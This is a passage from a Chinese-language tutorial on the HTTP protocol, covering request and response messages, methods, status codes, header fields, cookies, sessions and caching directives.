<li>建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。</li>
<li>服务器接到请求后，进行处理，然后将处理结果响应客户端，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。</li>
<li>客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。(HTTP1.1后不会立即关闭)</li>
</ol>
<p>如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程是由HTTP自己完成的，用户只要用鼠标点击，等待信息显示就可以了。</p>
<h2 id="http-工作原理" tabindex="-1"> HTTP 工作原理</h2>
<p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<ol>
<li>客户端连接到Web服务器
<ul>
<li>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.oakcms.cn。</li>
</ul>
</li>
<li>发送HTTP请求
<ul>
<li>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</li>
</ul>
</li>
<li>服务器接受请求并返回HTTP响应
<ul>
<li>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</li>
</ul>
</li>
<li>释放连接TCP连接
<ul>
<li>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求</li>
</ul>
</li>
<li>客户端浏览器解析HTML内容
<ul>
<li>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</li>
</ul>
</li>
</ol>
<h2 id="请求和响应报文" tabindex="-1"> 请求和响应报文</h2>
<h3 id="_1-请求报文" tabindex="-1"> 1. 请求报文</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP_RequestMessageExample.png" width=""/> </div><br>
<p>请求格式结构</p>
<ul>
<li>请求行：消息报头，一般用来说明客户端要使用的一些附加信息</li>
<li>请求头：请求方式、请求的地址和HTTP协议版本</li>
<li>空行： 位于请求头和请求数据之间，空行是必须的。</li>
<li>请求数据：非必须。</li>
</ul>
<h3 id="_2-响应报文" tabindex="-1"> 2. 响应报文</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP_ResponseMessageExample.png" width=""/> </div><br>
<p>响应格式的结构：</p>
<ul>
<li>响应行(状态行)：HTTP版本、状态码、状态消息</li>
<li>响应头：消息报头，客户端使用的附加信息</li>
<li>空行：响应头和响应实体之间的，必须的。</li>
<li>响应实体：正文，服务器返回给浏览器的信息</li>
</ul>
<h2 id="http-请求方法" tabindex="-1"> HTTP 请求方法</h2>
<p>客户端发送的  <strong>请求报文</strong>  第一行为请求行，包含了方法字段。</p>
<p>HTTP1.0定义了三种请求方法：GET, POST 和 HEAD方法。
HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<table>
<thead>
<tr>
<th>请求方法</th>
<th>用途</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>获取资源</td>
<td>请求指定的页面信息，并返回实体主体。</td>
</tr>
<tr>
<td>HEAD</td>
<td>获取报文首部</td>
<td>和 GET 方法类似，但是不返回报文实体主体部分。主要用于确认 URL 的有效性以及资源更新的日期时间等。</td>
</tr>
<tr>
<td>POST</td>
<td>传输实体主体</td>
<td>向指定资源提交数据进行处理请求。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td>
</tr>
<tr>
<td>PUT</td>
<td>上传文件</td>
<td>从客户端向服务器传送的数据取代指定的文档的内容。由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</td>
</tr>
<tr>
<td>DELETE</td>
<td>删除文件</td>
<td>请求服务器删除指定的页面。与 PUT 功能相反，并且同样不带验证机制。</td>
</tr>
<tr>
<td>CONNECT</td>
<td>要求在与代理服务器通信时建立隧道</td>
<td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>查询支持的方法</td>
<td>允许客户端查看服务器的性能。查询指定的 URL 能够支持的方法。会返回 <code>Allow: GET, POST, HEAD, OPTIONS</code> 这样的内容。</td>
</tr>
<tr>
<td>TRACE</td>
<td>追踪路径</td>
<td>回显服务器收到的请求，主要用于测试或诊断。</td>
</tr>
<tr>
<td>PATCH</td>
<td>对资源进行部分修改</td>
<td>PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。</td>
</tr>
</tbody>
</table>
<p><strong>CONNECT</strong></p>
<blockquote>
<p>要求在与代理服务器通信时建立隧道</p>
</blockquote>
<p>使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<div><pre><code>CONNECT www.example.com:443 HTTP/1.1
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg" width=""/> </div><br>
<p><strong>TRACE</strong></p>
<blockquote>
<p>追踪路径</p>
</blockquote>
<p>服务器会将通信路径返回给客户端。</p>
<p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。</p>
<p>通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。</p>
<h2 id="get-和-post-比较" tabindex="-1"> GET 和 POST 比较</h2>
<h3 id="作用" tabindex="-1"> 作用</h3>
<p>GET 用于获取资源，而 POST 用于传输实体主体。</p>
<h3 id="参数" tabindex="-1"> 参数</h3>
<p>GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。</p>
<p>因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 <code>中文</code> 会转换为 <code>%E4%B8%AD%E6%96%87</code>，而空格会转换为 <code>%20</code>。POST 参数支持标准字符集。</p>
<div><pre><code>GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1
</code></pre></div><div><pre><code>POST /test/demo_form.asp HTTP/1.1
Host: w3schools.com
name1=value1&amp;name2=value2
</code></pre></div><h3 id="安全" tabindex="-1"> 安全</h3>
<p>安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。</p>
<p>GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。</p>
<p>安全的方法除了 GET 之外还有：HEAD、OPTIONS。</p>
<p>不安全的方法除了 POST 之外还有 PUT、DELETE。</p>
<h3 id="幂等性" tabindex="-1"> 幂等性</h3>
<p>幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。</p>
<p>所有的安全方法也都是幂等的。</p>
<p>在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。</p>
<p>GET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的：</p>
<div><pre><code>GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
</code></pre></div><p>POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录：</p>
<div><pre><code>POST /add_row HTTP/1.1   -> Adds a 1nd row
POST /add_row HTTP/1.1   -> Adds a 2nd row
POST /add_row HTTP/1.1   -> Adds a 3rd row
</code></pre></div><p>DELETE /idX/delete HTTP/1.1 是幂等的，即使不同的请求接收到的状态码不一样：</p>
<div><pre><code>DELETE /idX/delete HTTP/1.1   -> Returns 200 if idX exists
DELETE /idX/delete HTTP/1.1   -> Returns 404 as it just got deleted
DELETE /idX/delete HTTP/1.1   -> Returns 404
</code></pre></div><h3 id="可缓存" tabindex="-1"> 可缓存</h3>
<p>如果要对响应进行缓存，需要满足以下条件：</p>
<ul>
<li>请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。</li>
<li>响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。</li>
<li>响应报文的 Cache-Control 首部字段没有指定不进行缓存。</li>
</ul>
<h3 id="xmlhttprequest" tabindex="-1"> XMLHttpRequest</h3>
<p>为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：</p>
<blockquote>
<p>XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。</p>
</blockquote>
<ul>
<li>在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。</li>
<li>而 GET 方法 Header 和 Data 会一起发送。</li>
</ul>
<h2 id="http-状态码" tabindex="-1"> HTTP 状态码</h2>
<p>服务器返回的  <strong>响应报文</strong>  中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。</p>
<table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">类别</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1XX</td>
<td style="text-align:center">Informational（信息性状态码）</td>
<td style="text-align:center">接收的请求正在处理</td>
</tr>
<tr>
<td style="text-align:center">2XX</td>
<td style="text-align:center">Success（成功状态码）</td>
<td style="text-align:center">请求正常处理完毕</td>
</tr>
<tr>
<td style="text-align:center">3XX</td>
<td style="text-align:center">Redirection（重定向状态码）</td>
<td style="text-align:center">需要进行附加操作以完成请求</td>
</tr>
<tr>
<td style="text-align:center">4XX</td>
<td style="text-align:center">Client Error（客户端错误状态码）</td>
<td style="text-align:center">服务器无法处理请求</td>
</tr>
<tr>
<td style="text-align:center">5XX</td>
<td style="text-align:center">Server Error（服务器错误状态码）</td>
<td style="text-align:center">服务器处理请求出错</td>
</tr>
</tbody>
</table>
<p><strong>1XX 信息</strong></p>
<ul>
<li><strong>100 Continue</strong> ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</li>
</ul>
<p><strong>2XX 成功</strong></p>
<ul>
<li><strong>200 OK</strong></li>
<li><strong>204 No Content</strong> ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</li>
<li><strong>206 Partial Content</strong> ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。</li>
</ul>
<p><strong>3XX 重定向</strong></p>
<ul>
<li><strong>301 Moved Permanently</strong> ：永久性重定向</li>
<li><strong>302 Found</strong> ：临时性重定向</li>
<li><strong>303 See Other</strong> ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</li>
<li>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</li>
<li><strong>304 Not Modified</strong> ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</li>
<li><strong>307 Temporary Redirect</strong> ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</li>
</ul>
<p><strong>4XX 客户端错误</strong></p>
<ul>
<li><strong>400 Bad Request</strong> ：请求报文中存在语法错误。</li>
<li><strong>401 Unauthorized</strong> ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</li>
<li><strong>403 Forbidden</strong> ：请求被拒绝。</li>
<li><strong>404 Not Found</strong></li>
</ul>
<p><strong>5XX 服务器错误</strong></p>
<ul>
<li><strong>500 Internal Server Error</strong> ：服务器正在执行请求时发生错误。</li>
<li><strong>503 Service Unavailable</strong> ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</li>
</ul>
<h1 id="三、http-首部" tabindex="-1"> 三、HTTP 首部</h1>
<p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p>
<p>各种首部字段及其含义如下（不需要全记，仅供查阅）：</p>
<h2 id="通用首部字段" tabindex="-1"> 通用首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Cache-Control</td>
<td style="text-align:center">控制缓存的行为</td>
</tr>
<tr>
<td style="text-align:center">Connection</td>
<td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td>
</tr>
<tr>
<td style="text-align:center">Date</td>
<td style="text-align:center">创建报文的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Pragma</td>
<td style="text-align:center">报文指令</td>
</tr>
<tr>
<td style="text-align:center">Trailer</td>
<td style="text-align:center">报文末端的首部一览</td>
</tr>
<tr>
<td style="text-align:center">Transfer-Encoding</td>
<td style="text-align:center">指定报文主体的传输编码方式</td>
</tr>
<tr>
<td style="text-align:center">Upgrade</td>
<td style="text-align:center">升级为其他协议</td>
</tr>
<tr>
<td style="text-align:center">Via</td>
<td style="text-align:center">代理服务器的相关信息</td>
</tr>
<tr>
<td style="text-align:center">Warning</td>
<td style="text-align:center">错误通知</td>
</tr>
</tbody>
</table>
<h2 id="请求首部字段" tabindex="-1"> 请求首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept</td>
<td style="text-align:center">用户代理可处理的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Accept-Charset</td>
<td style="text-align:center">优先的字符集</td>
</tr>
<tr>
<td style="text-align:center">Accept-Encoding</td>
<td style="text-align:center">优先的内容编码</td>
</tr>
<tr>
<td style="text-align:center">Accept-Language</td>
<td style="text-align:center">优先的语言（自然语言）</td>
</tr>
<tr>
<td style="text-align:center">Authorization</td>
<td style="text-align:center">Web 认证信息</td>
</tr>
<tr>
<td style="text-align:center">Expect</td>
<td style="text-align:center">期待服务器的特定行为</td>
</tr>
<tr>
<td style="text-align:center">From</td>
<td style="text-align:center">用户的电子邮箱地址</td>
</tr>
<tr>
<td style="text-align:center">Host</td>
<td style="text-align:center">请求资源所在服务器</td>
</tr>
<tr>
<td style="text-align:center">If-Match</td>
<td style="text-align:center">比较实体标记（ETag）</td>
</tr>
<tr>
<td style="text-align:center">If-Modified-Since</td>
<td style="text-align:center">比较资源的更新时间</td>
</tr>
<tr>
<td style="text-align:center">If-None-Match</td>
<td style="text-align:center">比较实体标记（与 If-Match 相反）</td>
</tr>
<tr>
<td style="text-align:center">If-Range</td>
<td style="text-align:center">资源未更新时发送实体 Byte 的范围请求</td>
</tr>
<tr>
<td style="text-align:center">If-Unmodified-Since</td>
<td style="text-align:center">比较资源的更新时间（与 If-Modified-Since 相反）</td>
</tr>
<tr>
<td style="text-align:center">Max-Forwards</td>
<td style="text-align:center">最大传输逐跳数</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authorization</td>
<td style="text-align:center">代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Range</td>
<td style="text-align:center">实体的字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Referer</td>
<td style="text-align:center">对请求中 URI 的原始获取方</td>
</tr>
<tr>
<td style="text-align:center">TE</td>
<td style="text-align:center">传输编码的优先级</td>
</tr>
<tr>
<td style="text-align:center">User-Agent</td>
<td style="text-align:center">HTTP 客户端程序的信息</td>
</tr>
</tbody>
</table>
<h2 id="响应首部字段" tabindex="-1"> 响应首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept-Ranges</td>
<td style="text-align:center">是否接受字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Age</td>
<td style="text-align:center">推算资源创建经过时间</td>
</tr>
<tr>
<td style="text-align:center">ETag</td>
<td style="text-align:center">资源的匹配信息</td>
</tr>
<tr>
<td style="text-align:center">Location</td>
<td style="text-align:center">令客户端重定向至指定 URI</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authenticate</td>
<td style="text-align:center">代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Retry-After</td>
<td style="text-align:center">对再次发起请求的时机要求</td>
</tr>
<tr>
<td style="text-align:center">Server</td>
<td style="text-align:center">HTTP 服务器的安装信息</td>
</tr>
<tr>
<td style="text-align:center">Vary</td>
<td style="text-align:center">代理服务器缓存的管理信息</td>
</tr>
<tr>
<td style="text-align:center">WWW-Authenticate</td>
<td style="text-align:center">服务器对客户端的认证信息</td>
</tr>
</tbody>
</table>
<h2 id="实体首部字段" tabindex="-1"> 实体首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Allow</td>
<td style="text-align:center">资源可支持的 HTTP 方法</td>
</tr>
<tr>
<td style="text-align:center">Content-Encoding</td>
<td style="text-align:center">实体主体适用的编码方式</td>
</tr>
<tr>
<td style="text-align:center">Content-Language</td>
<td style="text-align:center">实体主体的自然语言</td>
</tr>
<tr>
<td style="text-align:center">Content-Length</td>
<td style="text-align:center">实体主体的大小</td>
</tr>
<tr>
<td style="text-align:center">Content-Location</td>
<td style="text-align:center">替代对应资源的 URI</td>
</tr>
<tr>
<td style="text-align:center">Content-MD5</td>
<td style="text-align:center">实体主体的报文摘要</td>
</tr>
<tr>
<td style="text-align:center">Content-Range</td>
<td style="text-align:center">实体主体的位置范围</td>
</tr>
<tr>
<td style="text-align:center">Content-Type</td>
<td style="text-align:center">实体主体的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Expires</td>
<td style="text-align:center">实体主体过期的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Last-Modified</td>
<td style="text-align:center">资源的最后修改日期时间</td>
</tr>
</tbody>
</table>
<h1 id="四、具体应用" tabindex="-1"> 四、具体应用</h1>
<h2 id="连接管理" tabindex="-1"> 连接管理</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP1_x_Connections.png" width="800"/> </div><br>
<h3 id="_1-短连接与长连接" tabindex="-1"> 1. 短连接与长连接</h3>
<p>当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。</p>
<p>长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。</p>
<ul>
<li>从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 <code>Connection : close</code>；</li>
<li>在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 <code>Connection : Keep-Alive</code>。</li>
</ul>
<h3 id="_2-流水线" tabindex="-1"> 2. 流水线</h3>
<p>默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。</p>
<p>流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。</p>
<h2 id="cookie" tabindex="-1"> Cookie</h2>
<p>HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。</p>
<p>Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。</p>
<p>Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。</p>
<h3 id="_1-用途" tabindex="-1"> 1. 用途</h3>
<ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
<h3 id="_2-创建过程" tabindex="-1"> 2. 创建过程</h3>
<p>服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。</p>
<div><pre><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre></div><p>客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。</p>
<div><pre><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div><h3 id="_3-分类" tabindex="-1"> 3. 分类</h3>
<ul>
<li>会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li>
<li>持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。</li>
</ul>
<div><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><h3 id="_4-作用域" tabindex="-1"> 4. 作用域</h3>
<p>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。</p>
<p>Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (&quot;/&quot;) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：</p>
<ul>
<li>/docs</li>
<li>/docs/Web/</li>
<li>/docs/Web/HTTP</li>
</ul>
<h3 id="_5-javascript" tabindex="-1"> 5. JavaScript</h3>
<p>浏览器通过 <code>document.cookie</code> 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p>
<div><pre><code>document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
</code></pre></div><h3 id="_6-httponly" tabindex="-1"> 6. HttpOnly</h3>
<p>标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 <code>document.cookie</code> API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。</p>
<div><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><h3 id="_7-secure" tabindex="-1"> 7. Secure</h3>
<p>标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。</p>
<h3 id="_8-session" tabindex="-1"> 8. Session</h3>
<p>除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。</p>
<p>Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。</p>
<p>使用 Session 维护用户登录状态的过程如下：</p>
<ul>
<li>用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；</li>
<li>服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID；</li>
<li>服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；</li>
<li>客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。</li>
</ul>
<p>应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。</p>
<h3 id="_9-浏览器禁用-cookie" tabindex="-1"> 9. 浏览器禁用 Cookie</h3>
<p>此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。</p>
<h3 id="_10-cookie-与-session-选择" tabindex="-1"> 10. Cookie 与 Session 选择</h3>
<ul>
<li>Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在考虑数据复杂性时首选 Session；</li>
<li>Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；</li>
<li>对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。</li>
</ul>
<h2 id="会话跟踪" tabindex="-1"> 会话跟踪</h2>
<p>会话跟踪是一种灵活、轻便的机制，它使Web上的状态编程变为可能。</p>
<p>HTTP是一种无状态协议，每当用户发出请求时，服务器就会做出响应，客户端与服务器之间的联系是离散的、非连续的。当用户在同一网站的多个页面之间转换时，根本无法确定是否是同一个客户，会话跟踪技术就可以解决这个问题。当一个客户在多个页面间切换时，服务器会保存该用户的信息。</p>
<p>有四种方法可以实现会话跟踪技术：URL重写、隐藏表单域、Cookie、Session。</p>
<ol>
<li>隐藏表单域：<input type="hidden">，非常适合步需要大量数据存储的会话应用。</li>
<li>URL 重写:URL 可以在后面附加参数，和服务器的请求一起发送，这些参数为名字/值对。</li>
<li>Cookie:一个 Cookie 是一个小的，已命名数据元素。服务器使用 SET-Cookie 头标将它作为 HTTP响应的一部分传送到客户端，客户端被请求保存 Cookie 值，在对同一服务器的后续请求使用一个Cookie 头标将之返回到服务器。与其它技术比较，Cookie 的一个优点是在浏览器会话结束后，甚至在客户端计算机重启后它仍可以保留其值</li>
<li>Session：使用 setAttribute(String str,Object obj)方法将对象捆绑到一个会话</li>
</ol>
<h2 id="缓存" tabindex="-1"> 缓存</h2>
<h3 id="_1-优点" tabindex="-1"> 1. 优点</h3>
<ul>
<li>缓解服务器压力；</li>
<li>降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。</li>
</ul>
<h3 id="_2-实现方法" tabindex="-1"> 2. 实现方法</h3>
<ul>
<li>让代理服务器进行缓存；</li>
<li>让客户端浏览器进行缓存。</li>
</ul>
<h3 id="_3-cache-control" tabindex="-1"> 3. Cache-Control</h3>
<p>HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。</p>
<p><strong>3.1 禁止进行缓存</strong></p>
<p>no-store 指令规定不能对请求或响应的任何一部分进行缓存。</p>
<div><pre><code>Cache-Control: no-store
</code></pre></div><p><strong>3.2 强制确认缓存</strong></p>
<p>no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。</p>
<div><pre><code>Cache-Control: no-cache
</code></pre></div><p><strong>3.3 私有缓存和公共缓存</strong></p>
<p>private 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。</p>
<div><pre><code>Cache-Control: private
</code></pre></div><p>public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。</p>
<div><pre><code>Cache-Control: public
</code></pre></div><p><strong>3.4 缓存过期机制</strong></p>
<p>max-age 指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。</p>
<p>max-age 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。</p>
<div><pre><code>Cache-Control: max-age=31536000
</code></pre></div><p>Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。</p>
<div><pre><code>Expires: Wed, 04 Jul 2012 08:26:05 GMT
</code></pre></div><ul>
<li>在 HTTP/1.1 中，会优先处理 max-age 指令；</li>
<li>在 HTTP/1.0 中，max-age 指令会被忽略掉。</li>
</ul>
<h3 id="_4-缓存验证" tabindex="-1"> 4. 缓存验证</h3>
